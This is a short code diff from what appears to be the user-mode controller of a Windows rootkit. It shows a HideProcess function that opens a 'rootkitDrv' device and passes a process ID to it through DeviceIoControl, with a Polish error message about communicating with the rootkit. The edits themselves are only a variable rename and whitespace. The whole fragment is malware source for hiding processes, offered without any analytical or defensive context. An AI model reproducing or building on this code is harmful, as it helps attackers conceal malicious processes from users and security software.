@@ -14,7 +14,7 @@ bool HideProcess(DWORD pid);
 
 bool HideProcess(DWORD pid)
 {
-	DWORD dwReturn;
+	DWORD bRead;
 
 	hRootkit = CreateFile(
 			"\\\\.\\rootkitDrv", 
@@ -24,7 +24,7 @@ bool HideProcess(DWORD pid)
 			FILE_ATTRIBUTE_NORMAL,
 			NULL);
 
-	if ( !hRootkit ) 
+	if ( !hRootkit )
 		return false;
 
 	if (!DeviceIoControl(hRootkit, 
@@ -33,7 +33,7 @@ bool HideProcess(DWORD pid)
 			sizeof(pid), 
 			NULL, 
 			0, 
-			&dwReturn, 
+			&bRead, 
 			NULL))
 	{
 		printf("Blad podczas komunikacji z rootkitem\n");
